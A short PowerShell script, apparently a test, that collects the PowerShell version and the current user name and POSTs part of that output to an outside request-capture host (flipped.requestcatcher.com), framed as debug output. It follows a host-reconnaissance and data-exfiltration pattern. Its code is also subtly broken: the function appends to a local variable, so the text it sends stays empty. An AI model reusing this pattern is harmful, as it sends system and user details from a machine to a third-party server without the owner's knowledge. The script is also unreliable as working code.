$output = ""

function Add-ToOutput {
    param([string]$Title, [string]$Data)
    $output += "`n===== [$Title] =====`n"
    $output += "$Data`n"
}

# --- Example data for testing ---
Add-ToOutput "PowerShell Version" $PSVersionTable.PSVersion
Add-ToOutput "Current User" (whoami)

# --- DEBUG PREVIEW ---
Write-Host "==== DEBUG OUTPUT PREVIEW ===="
Write-Host $output
Write-Host "==== END OF DEBUG ===="

# --- TEST: Try sending part of the output via POST ---
try {
    $preview = $output.Substring(0, [Math]::Min(500, $output.Length))
    Invoke-RestMethod -Uri "https://flipped.requestcatcher.com/" `
                      -Method POST `
                      -Body @{debug = $preview} `
                      -UseBasicParsing
    Write-Host "`nPOST sent successfully!"
} catch {
    Write-Host "`nPOST FAILED: $($_.Exception.Message)"
}
